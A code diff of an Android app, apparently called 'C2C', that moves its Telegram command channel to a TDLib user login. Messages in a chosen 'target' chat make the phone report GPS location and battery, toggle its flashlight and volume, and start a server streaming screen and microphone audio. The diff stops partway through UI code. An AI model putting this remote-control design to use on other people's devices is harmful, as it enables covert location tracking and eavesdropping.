@@ -9,17 +9,21 @@ import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.graphics.BitmapFactory
+import android.hardware.camera2.CameraManager
+import android.location.LocationManager
 import android.media.AudioFormat
+import android.media.AudioManager
 import android.media.AudioRecord
 import android.media.MediaRecorder
 import android.net.Uri
+import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.os.IBinder
 import android.provider.Settings
-import android.webkit.WebView
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -50,6 +54,7 @@ import androidx.compose.foundation.text.BasicTextField
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.rounded.*
 import androidx.compose.material3.*
+import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
@@ -66,6 +71,7 @@ import androidx.compose.ui.text.SpanStyle
 import androidx.compose.ui.text.buildAnnotatedString
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.input.OffsetMapping
+import androidx.compose.ui.text.input.PasswordVisualTransformation
 import androidx.compose.ui.text.input.TransformedText
 import androidx.compose.ui.text.input.VisualTransformation
 import androidx.compose.ui.text.style.TextAlign
@@ -75,7 +81,6 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.compose.ui.window.Dialog
 import androidx.compose.ui.window.DialogProperties
-import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.fragment.app.FragmentActivity
@@ -83,29 +88,25 @@ import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import androidx.lifecycle.viewmodel.compose.viewModel
 import androidx.navigation.compose.*
-import coil.compose.AsyncImage
 import com.c2c.ui.theme.*
 import io.ktor.client.HttpClient
 import io.ktor.client.engine.cio.CIO
-import io.ktor.client.request.get
 import io.ktor.client.request.post
 import io.ktor.client.request.setBody
-import io.ktor.client.statement.bodyAsText
 import io.ktor.server.application.*
 import io.ktor.server.engine.ApplicationEngine
 import io.ktor.server.engine.embeddedServer
 import io.ktor.server.routing.routing
 import io.ktor.server.websocket.*
 import io.ktor.websocket.*
-import kotlinx.coroutines.CancellationException
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.Job
 import kotlinx.coroutines.channels.Channel
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableSharedFlow
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import org.drinkless.tdlib.Client
+import org.drinkless.tdlib.TdApi
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
@@ -115,32 +116,17 @@ import java.util.Locale
 import java.util.concurrent.CopyOnWriteArrayList
 import kotlin.math.roundToInt
 
-data class PushMessage(
-    val id: Int, 
-    val label: String, 
-    val cmd: String, 
-    var defaultArg: String = "", 
-    val icon: String = "",
-    val isToggle: Boolean = false,
-    val toggledLabel: String = "",
-    val toggledCmd: String = "",
-    val toggledArg: String = ""
-)
-
+data class PushMessage(val id: Int, val label: String, val cmd: String, var defaultArg: String = "", val icon: String = "", val isToggle: Boolean = false, val toggledLabel: String = "", val toggledCmd: String = "", val toggledArg: String = "")
 data class TgMessage(val id: Long, val text: String, val isMe: Boolean, val timestamp: Long)
+enum class TdAuthState { INIT, WAIT_PHONE, WAIT_CODE, WAIT_PASSWORD, READY, CLOSED }
 
 object ServerCore {
     var ktorServer: ApplicationEngine? = null
     val liveSessions = CopyOnWriteArrayList<WebSocketServerSession>()
     val logsFlow = MutableSharedFlow<String>(replay = 50)
     val streamFlow = MutableSharedFlow<ByteArray>(replay = 5)
-    
-    // Using StateFlow so UI updates instantly when notification kills the server
     val isRunningFlow = MutableStateFlow(false)
-    var isRunning: Boolean
-        get() = isRunningFlow.value
-        set(value) { isRunningFlow.value = value }
-        
+    var isRunning: Boolean get() = isRunningFlow.value; set(value) { isRunningFlow.value = value }
     var lastStatusSlab = "System Ready. Waiting for link..."
 
     fun log(msg: String, isSuccess: Boolean? = null) {
@@ -152,43 +138,20 @@ object ServerCore {
 
 class C2ServerService : Service() {
     companion object { const val ACTION_STOP = "STOP_NODE" }
-
     override fun onCreate() {
         super.onCreate()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            getSystemService(NotificationManager::class.java).createNotificationChannel(
-                NotificationChannel("c2c_server", "Core Node Service", NotificationManager.IMPORTANCE_LOW)
-            )
-        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) getSystemService(NotificationManager::class.java).createNotificationChannel(NotificationChannel("c2c_server", "Core Node Service", NotificationManager.IMPORTANCE_LOW))
     }
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        if (intent?.action == ACTION_STOP) {
-            stopKtor()
-            stopSelf()
-            return START_NOT_STICKY
-        }
-
+        if (intent?.action == ACTION_STOP) { stopKtor(); stopSelf(); return START_NOT_STICKY }
         val port = intent?.getIntExtra("port", 8765) ?: 8765
-        
-        // Notification Kill Switch
         val stopIntent = Intent(this, C2ServerService::class.java).apply { action = ACTION_STOP }
-        val stopPendingIntent = PendingIntent.getService(this, 0, stopIntent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
-
-        val notification = NotificationCompat.Builder(this, "c2c_server")
-            .setContentTitle("C2C Node Active")
-            .setContentText("Listening on port $port")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "TERMINATE NODE", stopPendingIntent)
-            .build()
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) 
-        else startForeground(1, notification)
-
+        val stopPI = PendingIntent.getService(this, 0, stopIntent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
+        val notification = NotificationCompat.Builder(this, "c2c_server").setContentTitle("C2C Node Active").setContentText("Listening on port $port").setSmallIcon(android.R.drawable.ic_dialog_info).addAction(android.R.drawable.ic_menu_close_clear_cancel, "TERMINATE NODE", stopPI).build()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) else startForeground(1, notification)
         startKtor(port)
         return START_STICKY
     }
-
     private fun startKtor(port: Int) {
         if (ServerCore.isRunning) return
         try {
@@ -196,33 +159,22 @@ class C2ServerService : Service() {
                 install(WebSockets)
                 routing {
                     webSocket("/live") {
-                        ServerCore.liveSessions.add(this)
-                        ServerCore.log("LINK ESTABLISHED: ${call.request.local.remoteHost}", true)
+                        ServerCore.liveSessions.add(this); ServerCore.log("LINK ESTABLISHED: ${call.request.local.remoteHost}", true)
                         try { for (frame in incoming) { if (frame is Frame.Binary) ServerCore.streamFlow.emit(frame.readBytes()) else if (frame is Frame.Text) ServerCore.log("RECV: ${frame.readText()}")} } 
                         finally { ServerCore.liveSessions.remove(this); ServerCore.log("LINK SEVERED", false) }
                     }
                 }
             }.start(wait = false)
-            ServerCore.isRunning = true
-            ServerCore.log("NODE STARTED ON 0.0.0.0:$port", true)
+            ServerCore.isRunning = true; ServerCore.log("NODE STARTED ON 0.0.0.0:$port", true)
         } catch (e: Exception) { ServerCore.log("NODE CRASH: ${e.message}", false) }
     }
-
-    private fun stopKtor() {
-        ServerCore.ktorServer?.stop(1000, 2000)
-        ServerCore.isRunning = false
-        ServerCore.liveSessions.clear()
-        ServerCore.log("NODE TERMINATED.", false)
-    }
-
-    override fun onDestroy() {
-        stopKtor()
-        super.onDestroy()
-    }
+    private fun stopKtor() { ServerCore.ktorServer?.stop(1000, 2000); ServerCore.isRunning = false; ServerCore.liveSessions.clear(); ServerCore.log("NODE TERMINATED.", false) }
+    override fun onDestroy() { stopKtor(); super.onDestroy() }
     override fun onBind(intent: Intent?): IBinder? = null
 }
 
 class CoreViewModel(application: Application) : AndroidViewModel(application) {
+    private val appCtx = application
     private val prefs = application.getSharedPreferences("CoreConfig", Context.MODE_PRIVATE)
     
     var topPanelCommands = mutableStateListOf<PushMessage>()
@@ -230,31 +182,159 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     var serverLogs = mutableStateListOf<String>()
     var latestSlabTxt by mutableStateOf(ServerCore.lastStatusSlab)
     
-    var tgMessages = mutableStateListOf<TgMessage>()
-    var tgBotName by mutableStateOf("Target Node")
-    var tgBotUser by mutableStateOf("@unknown_bot")
-    
+    // Hardware
     var isMicRunning by mutableStateOf(false)
     private val audioChannel = Channel<ByteArray>(Channel.UNLIMITED)
     var liveScreenFrame by mutableStateOf<ByteArray?>(null)
+    private val cameraManager = application.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+    private val audioManager = application.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+    private val locationManager = application.getSystemService(Context.LOCATION_SERVICE) as LocationManager
 
+    // HTTP Push
     val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }
-    private var tgPollingJob: Job? = null
+
+    // TDLib State
+    var tdClient: Client? = null
+    var tdAuthState by mutableStateOf(TdAuthState.CLOSED)
+    var tgMessages = mutableStateListOf<TgMessage>()
+    var tgChatName by mutableStateOf("Target Node")
+    var tgChatId by mutableStateOf(0L)
+    var isTdLibEngineRunning by mutableStateOf(false)
 
     init {
         loadConfigFromJson()
         viewModelScope.launch(Dispatchers.Main) { ServerCore.logsFlow.collect { log -> if (serverLogs.size > 150) serverLogs.removeAt(0); serverLogs.add(log); latestSlabTxt = ServerCore.lastStatusSlab } }
         viewModelScope.launch(Dispatchers.IO) { ServerCore.streamFlow.collect { bytes -> if (bytes.firstOrNull()?.toInt() == 0x03) liveScreenFrame = bytes.copyOfRange(1, bytes.size) } }
         viewModelScope.launch(Dispatchers.IO) { for (chunk in audioChannel) { ServerCore.liveSessions.forEach { try { it.send(Frame.Binary(true, chunk)) } catch (e: Exception) {} } } }
-        startTelegramPolling()
     }
 
+    // --- TDLib Engine ---
+    fun toggleTdLib() {
+        if (isTdLibEngineRunning) {
+            tdClient?.send(TdApi.Close()) { tdAuthState = TdAuthState.CLOSED; isTdLibEngineRunning = false }
+            tdClient = null
+        } else {
+            isTdLibEngineRunning = true
+            tdAuthState = TdAuthState.INIT
+            tgMessages.clear()
+            Client.execute(TdApi.SetLogVerbosityLevel(0))
+            tdClient = Client.create({ update -> handleTdUpdate(update) }, { _, _ -> }, { _ -> })
+        }
+    }
+
+    private fun handleTdUpdate(update: TdApi.Object) {
+        viewModelScope.launch(Dispatchers.Main) {
+            when (update) {
+                is TdApi.UpdateAuthorizationState -> {
+                    when (update.authorizationState) {
+                        is TdApi.AuthorizationStateWaitTdlibParameters -> {
+                            val params = TdApi.SetTdlibParameters().apply {
+                                useTestDc = false
+                                databaseDirectory = File(appCtx.filesDir, "tdlib").absolutePath
+                                useMessageDatabase = true
+                                useSecretChats = true
+                                apiId = prefs.getInt("tdApiId", 0)
+                                apiHash = prefs.getString("tdApiHash", "")
+                                systemLanguageCode = "en"
+                                deviceModel = Build.MODEL
+                                applicationVersion = "1.0"
+                            }
+                            tdClient?.send(params) { }
+                        }
+                        is TdApi.AuthorizationStateWaitPhoneNumber -> tdAuthState = TdAuthState.WAIT_PHONE
+                        is TdApi.AuthorizationStateWaitCode -> tdAuthState = TdAuthState.WAIT_CODE
+                        is TdApi.AuthorizationStateWaitPassword -> tdAuthState = TdAuthState.WAIT_PASSWORD
+                        is TdApi.AuthorizationStateReady -> {
+                            tdAuthState = TdAuthState.READY
+                            tgChatId = prefs.getLong("tdTargetChatId", 0L)
+                            if (tgChatId != 0L) fetchChatHistory()
+                        }
+                        is TdApi.AuthorizationStateClosed -> { tdAuthState = TdAuthState.CLOSED; isTdLibEngineRunning = false }
+                    }
+                }
+                is TdApi.UpdateNewMessage -> {
+                    val msg = update.message
+                    if (msg.chatId == tgChatId) {
+                        val content = msg.content
+                        if (content is TdApi.MessageText) {
+                            tgMessages.add(TgMessage(msg.id, content.text.text, msg.isOutgoing, msg.date * 1000L))
+                            tgMessages.sortBy { it.timestamp }
+                            if (!msg.isOutgoing) executeHardwareCommand(content.text.text)
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    fun tdSendPhone(phone: String) = tdClient?.send(TdApi.SetAuthenticationPhoneNumber(phone, null)) { }
+    fun tdSendCode(code: String) = tdClient?.send(TdApi.CheckAuthenticationCode(code)) { }
+    fun tdSendPassword(pass: String) = tdClient?.send(TdApi.CheckAuthenticationPassword(pass)) { }
+
+    private fun fetchChatHistory() {
+        tdClient?.send(TdApi.GetChat(tgChatId)) { chat -> if (chat is TdApi.Chat) viewModelScope.launch(Dispatchers.Main) { tgChatName = chat.title } }
+        tdClient?.send(TdApi.GetChatHistory(tgChatId, 0, 0, 50, false)) { res ->
+            if (res is TdApi.Messages) {
+                viewModelScope.launch(Dispatchers.Main) {
+                    val newMsgs = res.messages.filter { it.content is TdApi.MessageText }.map { msg ->
+                        TgMessage(msg.id, (msg.content as TdApi.MessageText).text.text, msg.isOutgoing, msg.date * 1000L)
+                    }
+                    tgMessages.clear()
+                    tgMessages.addAll(newMsgs.reversed())
+                }
+            }
+        }
+    }
+
+    fun sendTelegramMessage(text: String) {
+        if (tgChatId == 0L || tdClient == null) return
+        val content = TdApi.InputMessageText(TdApi.FormattedText(text, emptyArray()), false, false)
+        tdClient?.send(TdApi.SendMessage(tgChatId, 0, 0, null, null, content)) { }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun executeHardwareCommand(cmdString: String) {
+        val parts = cmdString.split(" ")
+        val cmd = parts[0].lowercase().removePrefix("/")
+        val arg = if (parts.size > 1) parts[1] else ""
+        viewModelScope.launch(Dispatchers.IO) {
+            when (cmd) {
+                "ping" -> {
+                    val bat = appCtx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+                    sendTelegramMessage("🟢 Node Online.\n🔋 Battery: $bat%")
+                }
+                "loc" -> {
+                    sendTelegramMessage("🛰️ Fetching GPS...")
+                    try {
+                        val loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                        if (loc != null) sendTelegramMessage("📍 <b>Location Acquired:</b>\nLat: ${loc.latitude}\nLng: ${loc.longitude}") else sendTelegramMessage("❌ Location unavailable.")
+                    } catch (e: Exception) { sendTelegramMessage("❌ GPS Error") }
+                }
+                "flash" -> {
+                    try {
+                        val state = arg.lowercase() == "on"
+                        cameraManager.setTorchMode(cameraManager.cameraIdList[0], state)
+                        sendTelegramMessage(if (state) "🔦 Flashlight Enabled" else "🔦 Flashlight Disabled")
+                    } catch (e: Exception) { sendTelegramMessage("❌ Camera Hardware Error.") }
+                }
+                "vol" -> {
+                    val targetVol = arg.toIntOrNull() ?: 50
+                    val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
+                    audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, (targetVol * max) / 100, 0)
+                    sendTelegramMessage("🔊 Volume set to $targetVol%")
+                }
+                "live_start" -> { sendTelegramMessage("⚡ Initiating Live WebSocket..."); toggleServer(appCtx) }
+                "live_stop" -> { ServerCore.ktorServer?.stop(1000, 2000); ServerCore.isRunning = false; sendTelegramMessage("🛑 Core Node Terminated.") }
+            }
+        }
+    }
+
+    // --- JSON Engine ---
     fun exportConfigToJson(): String {
         val root = JSONObject()
         root.put("network", JSONObject().put("ntfyUrl", prefs.getString("ntfyUrl", "https://ntfy.sh")).put("ntfyTopic", prefs.getString("ntfyTopic", "default_topic")))
         root.put("server", JSONObject().put("port", prefs.getInt("port", 8765)))
-        root.put("telegram", JSONObject().put("token", prefs.getString("tgToken", "")).put("chatId", prefs.getString("tgChatId", "")))
-        
+        root.put("tdlib", JSONObject().put("apiId", prefs.getInt("tdApiId", 0)).put("apiHash", prefs.getString("tdApiHash", "")).put("targetChatId", prefs.getLong("tdTargetChatId", 0L)))
         val tp = JSONArray(); topPanelCommands.forEach { tp.put(cmdToJson(it)) }; root.put("top_panel", tp)
         val cmds = JSONArray(); pushMessages.forEach { cmds.put(cmdToJson(it)) }; root.put("commands", cmds)
         return root.toString(4)
@@ -268,11 +348,11 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     fun importConfigFromJson(jsonStr: String): Boolean {
         return try {
             val root = JSONObject(jsonStr)
-            val net = root.getJSONObject("network"); val srv = root.getJSONObject("server"); val tg = root.getJSONObject("telegram")
+            val net = root.getJSONObject("network"); val srv = root.getJSONObject("server"); val td = root.getJSONObject("tdlib")
             prefs.edit().putString("ntfyUrl", net.getString("ntfyUrl")).putString("ntfyTopic", net.getString("ntfyTopic")).putInt("port", srv.getInt("port"))
-                .putString("tgToken", tg.getString("token")).putString("tgChatId", tg.getString("chatId"))
+                .putInt("tdApiId", td.getInt("apiId")).putString("tdApiHash", td.getString("apiHash")).putLong("tdTargetChatId", td.getLong("targetChatId"))
                 .putString("raw_top_panel", root.getJSONArray("top_panel").toString()).putString("raw_commands", root.getJSONArray("commands").toString()).apply()
-            loadConfigFromJson(); startTelegramPolling()
+            loadConfigFromJson()
             true
         } catch (e: Exception) { false }
     }
@@ -280,19 +360,16 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
     private fun loadConfigFromJson() {
         topPanelCommands.clear(); pushMessages.clear()
         val rawTp = prefs.getString("raw_top_panel", null); val rawCmds = prefs.getString("raw_commands", null)
-        
         if (rawTp != null && rawCmds != null) {
             try {
                 val tpArr = JSONArray(rawTp); for (i in 0 until tpArr.length()) { topPanelCommands.add(jsonToCmd(tpArr.getJSONObject(i))) }
                 val cmdArr = JSONArray(rawCmds); for (i in 0 until cmdArr.length()) { pushMessages.add(jsonToCmd(cmdArr.getJSONObject(i))) }
             } catch (e: Exception) {}
         } else {
-            // Pre-populate JSON with exactly what the user requested in the table
             topPanelCommands.add(PushMessage(1, "Flash", "flash", "on", "flashlight", true, "Flash Off", "flash", "off"))
             topPanelCommands.add(PushMessage(2, "Ping Node", "ping", "", "radar"))
             topPanelCommands.add(PushMessage(3, "Location", "loc", "", "location_on"))
             topPanelCommands.add(PushMessage(4, "Volume", "vol", "100", "volume_up", true, "Mute", "vol", "0"))
-            
             pushMessages.add(PushMessage(10, "Wake/Live Node", "live_start", "ws://0.0.0.0:8765/live", "router"))
             pushMessages.add(PushMessage(11, "Kill Node", "live_stop", "", "power_settings_new"))
             pushMessages.add(PushMessage(12, "Cam Front", "cam_front", "", "camera_front"))
@@ -301,16 +378,12 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
             pushMessages.add(PushMessage(15, "Full Info", "info", "", "info"))
             pushMessages.add(PushMessage(16, "Fetch Logs", "get_log", "", "description"))
             pushMessages.add(PushMessage(17, "Clear Logs", "clear_log", "", "delete_sweep"))
-            
             exportConfigToJson().let { importConfigFromJson(it) }
         }
     }
 
-    private fun jsonToCmd(obj: JSONObject) = PushMessage(
-        obj.getInt("id"), obj.getString("label"), obj.getString("cmd"), obj.optString("arg", ""), obj.optString("icon", ""),
-        obj.optBoolean("isToggle", false), obj.optString("toggledLabel", ""), obj.optString("toggledCmd", ""), obj.optString("toggledArg", "")
-    )
-
+    private fun jsonToCmd(obj: JSONObject) = PushMessage(obj.getInt("id"), obj.getString("label"), obj.getString("cmd"), obj.optString("arg", ""), obj.optString("icon", ""), obj.optBoolean("isToggle", false), obj.optString("toggledLabel", ""), obj.optString("toggledCmd", ""), obj.optString("toggledArg", ""))
+    
     fun updateCommandArg(id: Int, newArg: String) {
         val idx = pushMessages.indexOfFirst { it.id == id }
         if (idx != -1) { pushMessages[idx] = pushMessages[idx].copy(defaultArg = newArg); prefs.edit().putString("raw_commands", JSONArray(pushMessages.map { cmdToJson(it) }).toString()).apply() }
@@ -338,8 +411,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
 
     fun toggleServer(context: Context) {
         val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", prefs.getInt("port", 8765)) }
-        if (ServerCore.isRunning) { context.stopService(intent) } 
-        else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
+        if (ServerCore.isRunning) { context.stopService(intent) } else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
     }
 
     @SuppressLint("MissingPermission")
@@ -357,53 +429,6 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
     fun stopMic() { isMicRunning = false }
-
-    fun startTelegramPolling() {
-        tgPollingJob?.cancel()
-        val token = prefs.getString("tgToken", "") ?: ""; val chatId = prefs.getString("tgChatId", "") ?: ""
-        if (token.isBlank()) return
-        
-        viewModelScope.launch(Dispatchers.IO) {
-            try {
-                val botInfo = JSONObject(httpClient.get("https://api.telegram.org/bot$token/getMe").bodyAsText())
-                if (botInfo.getBoolean("ok")) {
-                    tgBotName = botInfo.getJSONObject("result").getString("first_name")
-                    tgBotUser = "@" + botInfo.getJSONObject("result").getString("username")
-                }
-            } catch(e: Exception){}
-        }
-        
-        var tgOffset = 0L
-        tgPollingJob = viewModelScope.launch(Dispatchers.IO) {
-            while (isActive) {
-                try {
-                    val res = JSONObject(httpClient.get("https://api.telegram.org/bot$token/getUpdates?offset=$tgOffset&timeout=15").bodyAsText())
-                    if (res.getBoolean("ok")) {
-                        val result = res.getJSONArray("result")
-                        for (i in 0 until result.length()) {
-                            val update = result.getJSONObject(i); tgOffset = update.getLong("update_id") + 1
-                            val msg = update.optJSONObject("message")?.optString("text", "")
-                            val date = update.optJSONObject("message")?.optLong("date", System.currentTimeMillis()/1000) ?: (System.currentTimeMillis()/1000)
-                            val fromId = update.optJSONObject("message")?.optJSONObject("from")?.optString("id", "")
-                            if (!msg.isNullOrBlank()) tgMessages.add(TgMessage(tgOffset, msg, fromId == chatId, date * 1000))
-                        }
-                    }
-                } catch (e: CancellationException) { throw e } catch (e: Exception) { delay(5000) }
-                delay(3000)
-            }
-        }
-    }
-    
-    fun sendTelegramMessage(text: String) {
-        val token = prefs.getString("tgToken", "") ?: ""; val chatId = prefs.getString("tgChatId", "") ?: ""
-        if(token.isBlank() || chatId.isBlank()) return
-        viewModelScope.launch(Dispatchers.IO) {
-            try {
-                httpClient.post("https://api.telegram.org/bot$token/sendMessage") { setBody("""{"chat_id":"$chatId","text":"${text.replace("\"", "\\\"")}"}""") }
-                tgMessages.add(TgMessage(System.currentTimeMillis(), text, true, System.currentTimeMillis()))
-            } catch (e: Exception) {}
-        }
-    }
 }
 
 fun getIconByName(name: String): ImageVector {
@@ -514,7 +539,7 @@ fun CommandsTab(viewModel: CoreViewModel) {
     Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
         Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
             Text("Control Matrix", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = TextPrimary, fontFamily = UbuntuFont)
-            Text("Swipe for Uplink ⯈", color = TextSecondary, fontSize = 12.sp, fontFamily = UbuntuFont)
+            Text("Swipe for TDLib Sync ⯈", color = TextSecondary, fontSize = 12.sp, fontFamily = UbuntuFont)
         }
         Spacer(modifier = Modifier.height(16.dp))
         
@@ -528,9 +553,7 @@ fun CommandsTab(viewModel: CoreViewModel) {
                             val arg = if(msg.isToggle && isToggled) msg.toggledArg else msg.defaultArg
                             viewModel.executePush(cmd, arg)
                             if(msg.isToggle) isToggled = !isToggled
-                        }) {
-                            Icon(getIconByName(msg.icon), null, tint = if(isToggled) PremiumPurple else PremiumTeal)
-                        }
+                        }) { Icon(getIconByName(msg.icon), null, tint = if(isToggled) PremiumPurple else PremiumTeal) }
                     }
                 }
                 Spacer(modifier = Modifier.height(8.dp))
@@ -569,7 +592,7 @@ fun CommandsTab(viewModel: CoreViewModel) {
     }
 }
 
-// ---- Telegram 1:1 Clone Tab ----
+// ---- Telegram TDLib Clone Tab ----
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun TelegramCloneTab(viewModel: CoreViewModel) {
@@ -578,52 +601,83 @@ fun TelegramCloneTab(viewModel: CoreViewModel) {
     LaunchedEffect(viewModel.tgMessages.size) { if(viewModel.tgMessages.isNotEmpty()) listState.animateScrollToItem(viewModel.tgMessages.size - 1) }
 
     Column(modifier = Modifier.fillMaxSize().background(TgBackground)) {
-        // Telegram Header
         TopAppBar(
             title = {
                 Row(verticalAlignment = Alignment.CenterVertically) {
-                    Box(modifier = Modifier.size(40.dp).clip(CircleShape).background(ActionBlue), contentAlignment = Alignment.Center) { Text(viewModel.tgBotName.take(1), color = Color.White, fontSize = 18.sp) }
+                    Box(modifier = Modifier.size(40.dp).clip(CircleShape).background(ActionBlue), contentAlignment = Alignment.Center) { Text(viewModel.tgChatName.take(1), color = Color.White, fontSize = 18.sp) }
                     Spacer(modifier = Modifier.width(12.dp))
                     Column {
                         Row(verticalAlignment = Alignment.CenterVertically) {
-                            Text(viewModel.tgBotName, color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Medium, fontFamily = UbuntuFont)
-                            Spacer(modifier = Modifier.width(6.dp))
-                            Text("bot", color = TextSecondary, fontSize = 12.sp, modifier = Modifier.background(Color(0xFF2B3A4C), RoundedCornerShape(4.dp)).padding(horizontal = 4.dp))
+                            Text(viewModel.tgChatName, color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Medium, fontFamily = UbuntuFont)
                         }
-                        Text(viewModel.tgBotUser, color = TextSecondary, fontSize = 13.sp, fontFamily = UbuntuFont)
+                        Text(if (viewModel.isTdLibEngineRunning) "TDLib Engine Syncing..." else "Engine Offline", color = if(viewModel.isTdLibEngineRunning) SuccessGreen else TextSecondary, fontSize = 11.sp, fontFamily = UbuntuFont)
                     }
                 }
             },
-            navigationIcon = { IconButton(onClick = { /* User swipes to go back */ }) { Icon(Icons.Rounded.ArrowBack, null, tint = Color.White) } },
-            actions = { IconButton(onClick = {}) { Icon(Icons.Rounded.MoreVert, null, tint = Color.White) } },
+            actions = {
+                IconButton(onClick = { viewModel.toggleTdLib() }) { Icon(Icons.Rounded.PowerSettingsNew, null, tint = if (viewModel.isTdLibEngineRunning) SuccessGreen else PremiumRose) }
+            },
             colors = TopAppBarDefaults.topAppBarColors(containerColor = TgHeader)
         )
         
-        // Chat Area
-        LazyColumn(state = listState, modifier = Modifier.weight(1f).padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
-            item { Spacer(modifier = Modifier.height(16.dp)) }
-            items(viewModel.tgMessages) { msg ->
-                val timeStr = SimpleDateFormat("h:mm a", Locale.getDefault()).format(Date(msg.timestamp))
-                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = if (msg.isMe) Arrangement.End else Arrangement.Start) {
-                    Card(
-                        shape = RoundedCornerShape(topStart = 16.dp, topEnd = 16.dp, bottomStart = if(msg.isMe) 16.dp else 4.dp, bottomEnd = if(msg.isMe) 4.dp else 16.dp),
-                        colors = CardDefaults.cardColors(containerColor = if(msg.isMe) TgBubbleOutgoing else TgBubbleIncoming),
-                        modifier = Modifier.widthIn(max = 300.dp)
-                    ) {
-                        Column(modifier = Modifier.padding(start = 12.dp, top = 8.dp, end = 12.dp, bottom = 6.dp)) {
-                            Text(msg.text, color = Color.White, fontSize = 15.sp, fontFamily = UbuntuFont)
-                            Row(modifier = Modifier.align(Alignment.End).padding(top = 2.dp), verticalAlignment = Alignment.CenterVertically) {
-                                Text(timeStr, color = Color(0x99FFFFFF), fontSize = 11.sp)
-                                if(msg.isMe) { Spacer(modifier = Modifier.width(4.dp)); Icon(Icons.Rounded.Check, null, tint = ActionBlue, modifier = Modifier.size(14.dp)) }
+        if (viewModel.tdAuthState == TdAuthState.WAIT_PHONE || viewModel.tdAuthState == TdAuthState.WAIT_CODE || viewModel.tdAuthState == TdAuthState.WAIT_PASSWORD) {
+            Box(modifier = Modifier.weight(1f).fillMaxWidth(), contentAlignment = Alignment.Center) {
+                Card(colors = CardDefaults.cardColors(containerColor = TgHeader), modifier = Modifier.padding(32.dp)) {
+                    var authInput by remember { mutableStateOf("") }
+                    Column(modifier = Modifier.padding(16.dp)) {
+                        Text(
+                            when(viewModel.tdAuthState) { TdAuthState.WAIT_PHONE -> "Enter Phone (+1234567890)"; TdAuthState.WAIT_CODE -> "Enter Telegram Code"; TdAuthState.WAIT_PASSWORD -> "Enter 2FA Password"; else -> ""},
+                            color = Color.White, fontFamily = UbuntuFont
+                        )
+                        Spacer(modifier = Modifier.height(8.dp))
+                        OutlinedTextField(value = authInput, onValueChange = { authInput = it }, textStyle = androidx.compose.ui.text.TextStyle(color = Color.White))
+                        Spacer(modifier = Modifier.height(8.dp))
+                        Button(onClick = {
+                            when(viewModel.tdAuthState) {
+                                TdAuthState.WAIT_PHONE -> viewModel.tdSendPhone(authInput)
+                                TdAuthState.WAIT_CODE -> viewModel.tdSendCode(authInput)
+                                TdAuthState.WAIT_PASSWORD -> viewModel.tdSendPassword(authInput)
+                                else -> {}
+                            }
+                            authInput = ""
+                        }) { Text("SUBMIT") }
+                    }
+                }
+            }
+        } else if (viewModel.tdAuthState == TdAuthState.CLOSED || !viewModel.isTdLibEngineRunning) {
+            Box(modifier = Modifier.weight(1f).fillMaxWidth(), contentAlignment = Alignment.Center) {
